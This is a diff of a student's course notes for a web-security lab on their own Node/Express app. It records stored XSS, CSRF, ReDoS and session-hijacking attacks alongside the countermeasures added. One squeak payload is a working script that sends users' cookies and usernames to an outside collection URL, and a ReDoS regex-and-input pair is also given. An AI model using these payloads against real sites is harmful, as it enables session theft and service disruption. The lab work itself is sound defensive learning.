@@ -15,7 +15,7 @@ Aufgabe 1:
 -Exercise 3: experimenting with request methods DONE 
 -Exercise 4: content generation DONE
 -DOS
-
+________________________________________________________________________________________________________________________________________________________________________________________________
 Aufgabe 2:
 -single page application mit überschrift @home, 3 Spalten der Räume mit gradzahl daneben in grau, jew. darunter button für versch. lichter mit versch. farben, based on state
 -load information from server about lights etc. regularly
@@ -36,11 +36,71 @@ Aufgabe 2:
 	-evtl. mit jquery statt xmlhttprequest nutzen nachdem fertig
 	-function die identifier der button empfängt und dann anhand von tabellen entscheidet welche get bzw. post anfragen sendet(nach post wir trotzem update zurückgesendet
 
-	
-	
+_________________________________________________________________________________________________________________________________________________________________________________________________	
+Submission 3:
+-changed a few things to keep submission2 workable.old "/" paht is now "/submission2"
+-made users like in the example with pw "12345678" and the stand user with username: daniel, pw: fisksoppa from the previous submission.
+
+Stored XSS Atack:
+The first attack with "<script>alert('Owned');</script>" was pretty straightforward. I was able to place the script as a "Squeak" and every user who logged in ran the script.	
+
+
+To get the cookies I used the following squeak and "squeaked" it 
+"<script>
+var xhttp = new XMLHttpRequest();
+console.log(document.getElementsByClassName("input-group-text")[0].innerHTML);
+ xhttp.open("POST", "https://dva446.herokuapp.com/store/156", true);
+ var username=document.getElementsByClassName("input-group-text")[0].innerHTML;
+ xhttp.send(username+":"+document.cookie);
+</script>"
+
+I tried to sign in with different users and their data were all sent to "https://dva446.herokuapp.com/store/156" and i could access it to see them.
+
+Countermeasures:
+settings the template engine up wasnt so difficult. But because i made the replacements in two steps: first replacing the values like name, card text etc. for every html snippet, combine them and then replace it in the template file. To simulate similar behaviour I used Mustache.render to render locally.
+Now everything was unescaped correctly.
+
+I also added the secure and httponly flags when i set cookies.
+
+CSRF Attack:
+First I analyzed how the "squeaking" is made by checking to which url, with whtat method and with which formdata are sent.
+url was: "https://localhost:8000/squeak"
+method was: "POST"
+and formdata was: "squeak:"csrf+test+to+check+how+the+request+is+made!"
+
+After that i used a simple html document place in the Public directory for convenience reasons and mad a small form which works with a hidden iframe.
+The value used for posting the squeak was "Click <a href='https://localhost:8000/csrfAttack.html'>here</a> to get the iPhobe X FREE!"
+
+Now i log in as "M. Schönfinkel" and "accidentaly" call "https://localhost:8000/csrfAttack.html". M. Schönfinkel posted the link (which is at least not directly clickable because of the escaping through mustache) and doesnt even know it, because the reload command was sent to the attacker website. He will only see it, once he refreshes the website.
+Next i signed in as "A. Church" and open the malicious link and posted it myself too.
+
+In order to protect against CSRF attacks i used sth. similiar to the "Double Submit Cookie" and set the cookies to samesite also.
+Every time "/" gets requested i send a knew encrypted csrfToken and set in the forms etc. the normal csrf cookie. This way i could prevent an csrf attack.
+
+As far as i understood csrf attacks are particularly dangerous when you can do things as an authenticated user like make bank transfers etc. Thats why I didnt protect the other endpoints. The damage is small.
+
+RegExp Denial of Service:
+i used as a username: "^(([a-z])+.)+[A-Z]([a-z])+$" and as a password "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" which resulted 
+in the server multiple minutes not beeing able to handle any request. But i couldnt take it offline.
+
+As a protection I encoded the username and check every symbol of the username against a blacklist with often used regex symbols.
+
 
 todo:
--iwie kann man trotzdem nach einloggen noch in / und in hauptseite ändert sich button behaviour nach refresh
+972 error mit json.parse
+-post json to /squeak
+-delete session if exists?
+disabled button
+-squeak working mayber with render, 
+-old code to work
+-signup seems to work
+-pw file deleted
+-serverseitig json senden mit type json usw
+{"sessionid":"c8a17f8228608dfceea391a23bcc1870","username":"A. Church "}
+%7B%22sessionid%22%3A123%2C%22username%22%3A%22A.%20Church%20%22%7D
+-schauen warum js nicht ganz geladen wird bzw. header nicht setzbar
+	=>weil weil es vorher abgefangen wurde und jetzt wird der express.static einen großteil übernehmen
+-datacontroller und filedata are the same	
 
 protect logout?
 -iwie klappt das neuladen nicht nachdem logout.vielleicht weil es kein formobject o.ä. ist
@@ -63,15 +123,46 @@ für angriffe:
 	
 
 
-
+__________________________________________________________________________________________________________________________
 
 known problems:
 
 
 mögliche problems:
 -url.parse nehmen um sicherheitslücke zu haben (siehe exercise 4)
-
+________________________________________________________________________________________________________________________________________________
 links:
+.object.values: https://developer.mozilla.org/de/docs/Web/JavaScript/Reference/Global_Objects/Object/values
+-json cookie reverse: https://wikimass.com/json/sort-reverse
+-append file: https://stackoverflow.com/questions/3459476/how-to-append-to-a-file-in-node
+-learn router in express: https://www.digitalocean.com/community/tutorials/learn-to-use-the-new-router-in-expressjs-4
+-express using middleware: https://expressjs.com/en/guide/using-middleware.html
+-nodejs crypto: https://nodejs.org/api/crypto.html#class-hmac
+-cookie parses npm: https://www.npmjs.com/package/cookie-parser
+-writing middleware in express: https://expressjs.com/en/guide/writing-middleware.html
+-server side forms validation: https://getbootstrap.com/docs/4.0/components/forms/#server-side
+-document.cookie: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
+-csrf prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+-mustache git: https://github.com/janl/mustache.js
+-mustache express: https://www.npmjs.com/package/mustache-express
+-good explanation: csrf
+-regex dos: https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
+-http cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+-cookie npm: https://www.npmjs.com/package/cookie
+-express route tester: http://forbeslindesay.github.io/express-route-tester/
+-path to regexp: https://www.npmjs.com/package/path-to-regexp
+-express and node: https://developer.mozilla.org/en-US/docs/Learn/Server-side/Express_Nodejs/Introduction#creating_route_handlers
+-express route and controllers: https://developer.mozilla.org/en-US/docs/Learn/Server-side/Express_Nodejs/routes
+-csrf cheat sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern
+-smart strings: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals
+-datetime manipulation: https://www.toptal.com/software/definitive-guide-to-datetime-manipulation
+-js current date: https://www.programiz.com/javascript/examples/display-current-date
+-js named arguments https://blog.bitsrc.io/javascript-why-named-arguments-are-better-than-positional-arguments-9b15ab3155ef
+-named parameters
+-check for undefined: https://stackoverflow.com/questions/3390396/how-can-i-check-for-undefined-in-javascript
+-comprehensive list of node.js express response methods: https://stackoverflow.com/questions/7042340/error-cant-set-headers-after-they-are-sent-to-the-client
+-https server express https://medium.com/@nitinpatel_20236/how-to-create-an-https-server-on-localhost-using-express-366435d61f28
+-passing variables to express middleware https://stackoverflow.com/questions/18875292/passing-variables-to-the-next-middleware-using-next-in-express-js
 -https://melvingeorge.me/blog/check-if-path-is-directory-nodejs : path is a directory?
 -https://nodejs.dev/learn/nodejs-file-paths could be nice for checking out the file endings
 -https://stackoverflow.com/questions/52908212/how-to-serve-static-files-in-vanilla-nodejs/52913289
@@ -81,10 +172,10 @@ links:
 -string in list? https://stackoverflow.com/questions/2430000/determine-if-string-is-in-list-in-javascript
 -file extension https://attacomsian.com/blog/nodejs-get-file-extension
 -null check https://stackoverflow.com/questions/2422946/javascript-check-for-not-null/34817844
+-xss overview https://owasp.org/www-community/attacks/xss/
 -grep suchen https://praxistipps.chip.de/unter-linux-nach-text-in-dateien-suchen-so-gehts_28711
 -switch case https://developer.mozilla.org/de/docs/Web/JavaScript/Reference/Statements/switch
 -xss video https://www.youtube.com/watch?v=dFci82qwXA0
--xss overview https://owasp.org/www-community/attacks/xss/
 -types of xss https://owasp.org/www-community/Types_of_Cross-Site_Scripting
 -cross site scripting prevention https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-prevention-rules
 -testing for xss https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html
@@ -116,7 +207,6 @@ links:
 -article on authentication authorization: https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512578(v=technet.10)
 -storage inspector https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector
 -types of attack session fixation etc https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#session_fixation
--set cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility
 -npm cookie package: https://www.npmjs.com/package/cookie
 -document.cookie: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
 -document.getelementbyid: https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById
@@ -144,7 +234,7 @@ links:
 morgen:
 -auf /information ohne query zugreifen
 -at first i tried randomized a lot of long password or parameters
-
+___________________________________________________________________________________
 
 Stealing the password file:
 
@@ -160,7 +250,7 @@ I made an extra function and encrypted the pw with pbkdf2Sync and the salt with 
 
 Temporarily i had a problem that my css etc. files werent loaded, probably because of some problems with the scope. I fixed it by saving the needed variable specifically.
 
-
+___________________________________________________________________________________________________________
 Session hijacking:
 I performed the attack exactly like written using chrome and firefox. After generating the correctly "guessed" cookie i was able to connect to the smart home part of the website without any problems.
 
@@ -174,6 +264,7 @@ As a bonus i check on the client side for the success of the xhr.If it fails and
 
 todo: password protection noch machen, session hijacking
 
+_____________________________________________________________________________________________________________________________________
 DOS attack
 i read about dos attacks and thought of the different possiblities my code could be attackable.
 -i might not thougt of every case to check for file existence or allowed filetypes. especially with the newly added routing function
@@ -185,7 +276,7 @@ i read about dos attacks and thought of the different possiblities my code could
 -the website waites for body data. what happens if the body data is to big
 - count keys of object https://stackoverflow.com/questions/126100/how-to-efficiently-count-the-number-of-keys-properties-of-an-object-in-javascrip
 
-
+_________________________________________________________________________________________________________________________________________________________
 first attacks:
 -i found out through my locks that i didnt thought of the ending .ico and its not loaded because of that
 -i generated random pairs of parameters and send them to localhost:8000/information?ab=ac etc. Started with 10 pairs and multiplied everytime times 10. Til about 10000. There i found out that the browser seems to cut the parameters at some point. I managed to send about 567 parameter pairs. but it doesnt crash the server.
@@ -194,13 +285,13 @@ first attacks:
 -through luck i found out that if i search for "localhost:8000/information" without the parameter the server crashes, becauce the the query object is null and i try to run a function on it. i fixed it by running a null check before.
 -i could also crash the server with "localhost:8000//" because that is an invalid url. I fixed it by catching the errors and return 404 answers.
 
-
+________________________________________________________________________________________________________________________________________________________________
 XSS Attack
 -I inserted the script "<script>alert('Owned');</script>" as a get parameter in "localhost:8000/inormation?search=nothing <script>alert('Owned');</script>" and the alert appeared.
 - i checked rule 0 and the only place im inserting the "untrusted" data is inside <td> elements. For rule 1 and 2 i made an specific function to encode data for the possiblities to do my own modifications in the future if neccessary. I encode explicitly all keys and values of the get parameter.
 
 
-
+________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
 
 
 
@@ -208,5 +299,45 @@ XSS Attack
 
 other stuff:
 -acces other stuff über path
+
+ <div class="card mb-2">
+            <div class="card-header">
+                M. Schönfinkel
+                <span class="float-right">Thu 10:42</span>
+            </div>
+            <div class="card-body">
+                <p class="card-text">Click &lt;a href&#x3D;&#x27;&#x27;&gt;here&lt;/a&gt; to get the iPhobe X FREE!</p>
+            </div>
+        </div>
+
+        <div class="card mb-2">
+            <div class="card-header">
+                A. Church
+                <span class="float-right">Tue 11:04</span>
+            </div>
+            <div class="card-body">
+                <p class="card-text">Do you like lambda calculus?</p>
+            </div>
+        </div>
+
+        <div class="card mb-2">
+            <div class="card-header">
+                H. Curry
+                <span class="float-right">Tue 10:52</span>
+            </div>
+            <div class="card-body">
+                <p class="card-text">There is a strong connection between lambda calculus and logic!</p>
+            </div>
+        </div>
+
+        <div class="card mb-2">
+            <div class="card-header">
+                M. Schönfinkel
+                <span class="float-right">Tue 10:49</span>
+            </div>
+            <div class="card-body">
+                <p class="card-text">It suffices with the S and K combinators!</p>
+            </div>
+        </div>
 
 
